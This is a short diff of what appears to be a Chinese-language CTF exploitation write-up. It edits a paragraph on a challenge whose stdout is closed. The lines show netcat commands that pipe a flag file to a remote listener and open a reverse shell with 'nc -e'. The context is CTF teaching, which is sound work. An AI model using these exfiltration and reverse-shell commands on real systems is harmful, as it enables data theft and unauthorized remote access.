@@ -454,7 +454,7 @@ pwndbg&gt; x/5i 0xffffffffff600000
 
 <p>还要注意的是, 程序的 stdout 被关掉了, 这个和 0ctf2018 的 babystack 类似, 可以使用 <code>cat flag| nc ip port</code> 的方式在公网 vps 上监听到(<code>nc -l -p port</code>)</p>
 
-<p>或者使用 <code>&gt;&amp;2 &lt;&amp;2 nc -e ip port</code> 来建立一个反向 shell, 原理可以参考</p>
+<p>或者使用 <code>nc -e ip port</code> 来建立一个反向 shell, 原理可以参考</p>
 
 <p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
 
